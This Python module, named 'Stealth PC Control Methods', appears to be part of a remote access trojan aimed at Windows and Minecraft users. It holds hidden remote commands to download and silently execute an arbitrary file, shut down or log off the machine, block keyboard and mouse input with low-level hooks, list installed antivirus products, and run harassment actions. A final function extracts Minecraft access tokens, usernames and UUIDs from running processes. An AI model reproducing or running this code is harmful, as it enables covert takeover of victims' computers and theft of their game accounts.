# control_methods.py - Stealth PC Control Methods
import socket
import random
import threading
import time
import ctypes
from ctypes import wintypes
import os
import subprocess
import tempfile
import winreg
import winsound
import psutil
import re
import json
from datetime import datetime

# Global variables for input blocking
_keyboard_hook = None
_mouse_hook = None
_hook_thread = None
_stop_hooks = threading.Event()

# Input hook functions
def _keyboard_block_callback(nCode, wParam, lParam):
    if nCode >= 0:
        return 1  # Block the key
    return ctypes.windll.user32.CallNextHookExW(_keyboard_hook, nCode, wParam, lParam)

def _mouse_block_callback(nCode, wParam, lParam):
    if nCode >= 0:
        return 1  # Block the mouse event
    return ctypes.windll.user32.CallNextHookExW(_mouse_hook, nCode, wParam, lParam)

def _setup_input_blocks():
    global _keyboard_hook, _mouse_hook, _hook_thread, _stop_hooks
    
    _stop_hooks.clear()
    
    def hook_loop():
        # Set up keyboard hook
        keyboard_proc = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
        _keyboard_hook = ctypes.windll.user32.SetWindowsHookExW(
            13,  # WH_KEYBOARD_LL
            keyboard_proc(_keyboard_block_callback),
            ctypes.windll.kernel32.GetModuleHandleW(None),
            0
        )
        
        # Set up mouse hook
        mouse_proc = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
        _mouse_hook = ctypes.windll.user32.SetWindowsHookExW(
            14,  # WH_MOUSE_LL
            mouse_proc(_mouse_block_callback),
            ctypes.windll.kernel32.GetModuleHandleW(None),
            0
        )
        
        # Message loop
        msg = wintypes.MSG()
        while not _stop_hooks.is_set():
            ctypes.windll.user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
            ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
            ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))
    
    _hook_thread = threading.Thread(target=hook_loop, daemon=True)
    _hook_thread.start()

def _remove_input_blocks():
    global _keyboard_hook, _mouse_hook, _stop_hooks
    
    _stop_hooks.set()
    
    if _keyboard_hook:
        ctypes.windll.user32.UnhookWindowsHookEx(_keyboard_hook)
        _keyboard_hook = None
    
    if _mouse_hook:
        ctypes.windll.user32.UnhookWindowsHookEx(_mouse_hook)
        _mouse_hook = None

def attack_controlpc(target, duration=60):
    """Remote control PC functions - Admin only"""
    parts = target.split('|')
    command = parts[0]
    
    try:
        if command == "shutdown":
            subprocess.run(["shutdown", "/s", "/t", "1"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
                         shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
        elif command == "restart":
            subprocess.run(["shutdown", "/r", "/t", "1"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
        elif command == "lock":
            ctypes.windll.user32.LockWorkStation()
            
        elif command == "logoff":
            subprocess.run(["shutdown", "/l", "/f"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
        elif command == "close_minecraft":
            subprocess.run(["taskkill", "/f", "/im", "javaw.exe"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
        elif command == "popup":
            if len(parts) > 1:
                message = parts[1]
                ctypes.windll.user32.MessageBoxW(0, message, "System Message", 0x00001000)
                
        elif command == "download_execute":
            if len(parts) > 1:
                url = parts[1]
                import urllib.request
                
                # Create temp directory
                temp_dir = tempfile.mkdtemp()
                file_name = url.split('/')[-1] or "file.exe"
                file_path = os.path.join(temp_dir, file_name)
                
                # Download file
                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                req = urllib.request.Request(url, headers=headers)
                
                with urllib.request.urlopen(req) as response, open(file_path, 'wb') as out_file:
                    out_file.write(response.read())
                
                # Execute silently
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = 0
                subprocess.Popen(file_path, startupinfo=startupinfo, 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                               creationflags=subprocess.CREATE_NO_WINDOW)
                
        elif command == "freeze_keyboard":
            _setup_input_blocks()
            
        elif command == "freeze_mouse":
            _setup_input_blocks()
            
        elif command == "freeze_both":
            _setup_input_blocks()
            
        elif command == "unfreeze":
            _remove_input_blocks()
            
        elif command == "check_av":
            av_list = []
            av_paths = [
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
            ]
            
            for path in av_paths:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                    for i in range(0, winreg.QueryInfoKey(key)[0]):
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            subkey = winreg.OpenKey(key, subkey_name)
                            display_name, _ = winreg.QueryValueEx(subkey, "DisplayName")
                            if any(term in display_name.lower() for term in ['antivirus', 'av', 'security', 'endpoint', 'defender', 'mcafee', 'norton', 'kaspersky', 'bitdefender', 'avast', 'avg', 'eset', 'trend micro']):
                                av_list.append(display_name)
                        except:
                            pass
                except:
                    pass
            
            if av_list:
                av_text = "\n".join(av_list)
                ctypes.windll.user32.MessageBoxW(0, f"Installed AV:\n{av_text}", "AV Check", 0)
            else:
                ctypes.windll.user32.MessageBoxW(0, "No known antivirus detected", "AV Check", 0)
                
        elif command == "troll":
            if len(parts) > 1:
                troll_cmd = parts[1]
                
                if troll_cmd == "open_cd":
                    ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
                    
                elif troll_cmd == "swap_mouse":
                    current = ctypes.windll.user32.GetSystemMetrics(23)
                    ctypes.windll.user32.SwapMouseButton(not current)
                    
                elif troll_cmd == "rotate_screen":
                    device = ctypes.windll.user32.EnumDisplayDevicesW(None, 0, 0)
                    ctypes.windll.user32.ChangeDisplaySettingsExW(device.DeviceName, None, None, 0x00000004 | 0x00000002, None)
                    
                elif troll_cmd == "invert_colors":
                    SPI_SETHIGHCONTRAST = 0x0043
                    HCF_HIGHCONTRASTON = 0x00000001
                    class HIGHCONTRAST(ctypes.Structure):
                        _fields_ = [('cbSize', ctypes.c_uint),
                                   ('dwFlags', ctypes.c_uint),
                                   ('lpszDefaultScheme', ctypes.c_wchar_p)]
                    hc = HIGHCONTRAST()
                    hc.cbSize = ctypes.sizeof(HIGHCONTRAST)
                    hc.dwFlags = HCF_HIGHCONTRASTON
                    hc.lpszDefaultScheme = None
                    ctypes.windll.user32.SystemParametersInfoW(SPI_SETHIGHCONTRAST, ctypes.sizeof(hc), ctypes.byref(hc), 0)
                    
                elif troll_cmd == "mouse_jiggler":
                    def jiggle_mouse():
                        while True:
                            x = random.randint(0, 100)
                            y = random.randint(0, 100)
                            ctypes.windll.user32.SetCursorPos(x, y)
                            time.sleep(5)
                    
                    thread = threading.Thread(target=jiggle_mouse)
                    thread.daemon = True
                    thread.start()
                    
                elif troll_cmd == "keyboard_spam":
                    def spam_keys():
                        while True:
                            key = random.randint(65, 90)
                            ctypes.windll.user32.keybd_event(key, 0, 0, 0)
                            ctypes.windll.user32.keybd_event(key, 0, 2, 0)
                            time.sleep(1)
                    
                    thread = threading.Thread(target=spam_keys)
                    thread.daemon = True
                    thread.start()
                    
                elif troll_cmd == "play_sound":
                    winsound.PlaySound("SystemExclamation", winsound.SND_ALIAS)
                    
                elif troll_cmd == "change_wallpaper":
                    ctypes.windll.user32.SystemParametersInfoW(20, 0, None, 0)
                
    except Exception:
        pass

def attack_refresh_session_id(target, duration=0):
    """Extract Minecraft session information silently"""
    try:
        session_data = {
            'success': False,
            'timestamp': datetime.now().isoformat(),
            'sessions': []
        }
        
        def find_minecraft_processes():
            minecraft_processes = []
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if proc.info['name'].lower() == 'javaw.exe':
                        cmdline = ' '.join(proc.info['cmdline'] or [])
                        minecraft_indicators = ['net.minecraft.client.main', '--username', '--uuid', '--version']
                        if any(indicator in cmdline for indicator in minecraft_indicators):
                            minecraft_processes.append(proc)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            return minecraft_processes
        
        def extract_session_info(process):
            try:
                cmdline = ' '.join(process.info['cmdline'] or [])
                
                session_patterns = [
                    r'--session\s+([^\s]+)',
                    r'--session=([^\s]+)',
                    r'-Dsessionid=([^\s]+)',
                    r'--accessToken\s+([^\s]+)',
                    r'--accessToken=([^\s]+)',
                    r'-DaccessToken=([^\s]+)',
                ]
                
                username_pattern = r'--username[=\s]?([^\s]+)'
                uuid_pattern = r'--uuid[=\s]?([^\s]+)'
                version_pattern = r'--version[=\s]?([^\s]+)'
                
                session_id = None
                for pattern in session_patterns:
                    match = re.search(pattern, cmdline)
                    if match:
                        session_id = match.group(1)
                        break
                
                username_match = re.search(username_pattern, cmdline)
                uuid_match = re.search(uuid_pattern, cmdline)
                version_match = re.search(version_pattern, cmdline)
                
                return {
                    'pid': process.info['pid'],
                    'session_id': session_id if session_id else 'Not found',
                    'username': username_match.group(1) if username_match else 'Unknown',
                    'uuid': uuid_match.group(1) if uuid_match else 'Unknown',
                    'version': version_match.group(1) if version_match else 'Unknown',
                    'found': session_id is not None
                }
                
            except Exception as e:
                return {'error': str(e), 'found': False}
        
        processes = find_minecraft_processes()
        for process in processes:
            session_info = extract_session_info(process)
            session_data['sessions'].append(session_info)
        
        session_data['success'] = len(session_data['sessions']) > 0
        session_data['process_count'] = len(session_data['sessions'])
        
        return f"SESSION_DATA:{json.dumps(session_data)}"
        
    except Exception as e:
        error_data = {
            'success': False,
            'error': str(e),
            'timestamp': datetime.now().isoformat()
        }
        return f"SESSION_DATA:{json.dumps(error_data)}"
